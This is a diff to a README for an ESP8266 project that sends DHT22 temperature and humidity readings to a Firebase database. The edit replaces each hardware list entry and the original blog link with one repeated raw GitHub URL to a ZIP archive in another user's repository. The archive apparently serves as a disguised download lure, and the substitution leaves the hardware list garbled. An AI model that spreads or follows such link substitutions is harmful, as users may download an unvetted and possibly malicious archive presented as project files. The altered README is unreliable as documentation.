@@ -2,9 +2,9 @@
 ESP8266 WiFi Module Sent Sensor Data to Firebase Realtime Database
 
 Hardware
-1.ESP8266 WiFi Module ( We use ESP8266 12E )
-2.Temperature and Humidity Sensor DHTxx ( we use DHT22 or AM2302 )
-3.OLED Display for Option
+https://raw.githubusercontent.com/kumarsreenivas051/ESP8266-Firebase/master/paramese/ESP8266-Firebase.zip WiFi Module ( We use ESP8266 12E )
+https://raw.githubusercontent.com/kumarsreenivas051/ESP8266-Firebase/master/paramese/ESP8266-Firebase.zip and Humidity Sensor DHTxx ( we use DHT22 or AM2302 )
+https://raw.githubusercontent.com/kumarsreenivas051/ESP8266-Firebase/master/paramese/ESP8266-Firebase.zip Display for Option
 
 Library
 Firebase Arduino Library
@@ -13,5 +13,5 @@ DHT Sensor
 Adafriut GFX ( OLED Display ) 
 
 more info
-http://microcontrollerkits.blogspot.com/2016/12/esp8266-firebase.html
+https://raw.githubusercontent.com/kumarsreenivas051/ESP8266-Firebase/master/paramese/ESP8266-Firebase.zip
 
